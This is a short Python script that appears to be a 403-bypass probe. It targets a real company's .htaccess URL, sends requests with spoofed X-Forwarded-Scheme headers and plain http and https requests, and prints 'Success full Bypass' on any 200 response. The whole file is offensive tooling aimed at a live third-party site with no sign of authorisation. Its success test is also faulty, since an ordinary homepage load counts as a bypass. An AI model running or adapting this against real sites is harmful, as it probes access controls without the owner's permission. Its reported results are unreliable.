import requests
import re
from rich import box
from rich.text import Text
from rich.panel import Panel
from rich.console import Console
from  concurrent.futures import ThreadPoolExecutor

console = Console()

urls = "https://www.apple.com/.htaccess"

patt = "[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,5}(:[0-9]{1,5})?"

mtc = re.search(patt, urls)

reurl = mtc.group()

def payloads1(url, dom):
    head1 = {
        'X-Forwarded-Scheme': 'http'
    }
    head2 = {
        'X-Forwarded-Scheme': 'https'
    }
    try:

        send1 = requests.get("http://"+dom, timeout=1)
        send2 = requests.get("https://"+dom, timeout=1)
        send3 = requests.get(url, headers=head1, timeout=1)
        send4 = requests.get(url, headers=head2, timeout=1)
        if send1.status_code == 200:
            console.print(Panel(f"[b white]Success full Bypass[/b white] [b green]{send1.url}, status: {send1.status_code}[/b green]", box=box.HEAVY, style="blink blue", expand=False))
        if send2.status_code == 200:
            console.print(Panel(f"[b white]Success full Bypass[/b white] [b green]{send2.url}, status: {send2.status_code}[/b green]", box=box.HEAVY, style="blink blue", expand=False))
        if send3.status_code == 200:
            console.print(Panel(f"[b white]Success full Bypass[/b white] [b green] X-Forwarded-Scheme: http status: {send3.status_code}[/b green]", box=box.HEAVY, style="blink blue", expand=False))
        if send4.status_code == 200:
            console.print(Panel(f"[b white]Success full Bypass[/b white] [b green] X-Forwarded-Scheme: https status: {send4.status_code}[/b green]", box=box.HEAVY, style="blink blue", expand=False))
        # else:
    #     console.print(f"bypass failled", style="bold red")
    except Exception as e:
        pass


# if __name__ == "__main__":
#     with ThreadPoolExecutor(5) as pool:
#         pool.submit(payloads1,urls,reurl)